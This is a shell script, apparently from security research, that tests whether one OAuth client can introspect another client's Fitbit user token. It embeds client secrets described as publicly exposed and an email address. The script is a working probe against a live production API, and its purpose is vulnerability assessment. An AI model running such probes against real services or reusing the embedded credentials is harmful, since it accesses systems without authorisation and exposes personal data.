#!/data/data/com.termux/files/usr/bin/bash
# g-introspect2.sh — cross-client introspection is confirmed. How much does it leak?
#
#   usage: bash scripts/g-introspect2.sh   (prompts for the Fitbit password)
#
# ESTABLISHED: 228TQD can introspect a token issued to 227ZG3. Control and sentinel
# both behaved, so that result is real. But both tokens were APP tokens with an
# empty scope, so the leak was small: active, client_id, exp.
#
# THE QUESTION THAT SETS THE SEVERITY: what comes back when the token being
# introspected is a USER token? Introspection normally also returns the user id and
# the granted scopes. If one client can learn which user a token belongs to and what
# that token can reach, that is a different finding from leaking an expiry.
#
# We mint the user token against OUR OWN account with OUR OWN password, using 227ZG3,
# and then introspect it as 228TQD. Nobody else's token is touched.
set -u
A=$(printf '227ZG3:458dd4f32a9db4957cf15fd464be196d' | base64 -w0 2>/dev/null || printf '227ZG3:458dd4f32a9db4957cf15fd464be196d' | base64)
B=$(printf '228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a' | base64 -w0 2>/dev/null || printf '228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a' | base64)
I=https://api.fitbit.com/1.1/oauth2/introspect
USER="${1:-kaseym484@gmail.com}"

read -rsp "Fitbit password for $USER: " PW; echo
echo "  password length: ${#PW}"
[ "${#PW}" -lt 4 ] && { echo "  empty — nothing sent."; exit 1; }

echo
echo "minting a USER token with 227ZG3 (our own account)..."
RESP=$(curl -s --max-time 16 -X POST https://api.fitbit.com/oauth2/token -H "Authorization: Basic $A" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=password' --data-urlencode "username=$USER" --data-urlencode "password=$PW" \
  --data-urlencode 'scope=profile')
unset PW
printf '  %s\n\n' "$(printf '%s' "$RESP" | head -c 260)"
UT=$(printf '%s' "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
if [ "${#UT}" -lt 50 ]; then
  echo "  No user token. If this says Invalid username/password, the account has no"
  echo "  native Fitbit password (it was made through Google) and this test cannot run."
  echo "  That is a limit, not a result — do not record it as secure."
  exit 1
fi
printf '  user token minted: %s chars\n\n' "${#UT}"

echo "######################################################################"
echo "# What does 228TQD learn about a USER token issued to 227ZG3?        #"
echo "######################################################################"
for p in "[CONTROL]  227ZG3 reads its own user token:$A" "[CROSS]    228TQD reads 227ZG3's user token:$B"; do
  printf '  %-46s ' "${p%%:*}"
  curl -s --max-time 14 -X POST "$I" -H "Authorization: Basic ${p##*:}" \
    -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "token=$UT" \
    -w ' [%{http_code}]\n' | tr -d '\n' | head -c 420; echo
  sleep 2
done
printf '  %-46s ' "[SENTINEL] 228TQD reads a fake token"
curl -s --max-time 14 -X POST "$I" -H "Authorization: Basic $B" \
  -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "token=ZZZNOTATOKEN7x2" \
  -w ' [%{http_code}]\n' | tr -d '\n' | head -c 200; echo

cat <<'TXT'

  HOW TO READ

    CROSS returns user_id and/or the real scopes
        -> one OAuth client can learn WHICH USER another client's token belongs to
           and WHAT it can reach, using a secret published on a public page. That is
           a cross-client information disclosure about a named user, not an expiry
           leak, and it carries the finding.

    CROSS returns the same thin shape as the app token (active, client_id, exp)
        -> the leak stays small. Report it as Low and say so plainly.

    CROSS matches the SENTINEL
        -> user tokens ARE bound even though app tokens are not. Worth reporting as
           an inconsistency, and worth saying that app tokens leak while user tokens
           do not.
TXT
